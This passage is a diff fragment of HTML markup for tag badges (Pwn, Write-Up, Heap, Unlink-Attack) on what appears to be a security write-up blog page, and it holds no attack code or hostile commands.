-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Pwn
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/write-up/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Write-Up
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/heap/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Heap
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/unlink-attack/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Unlink-Attack
   </span>
 </span>
 
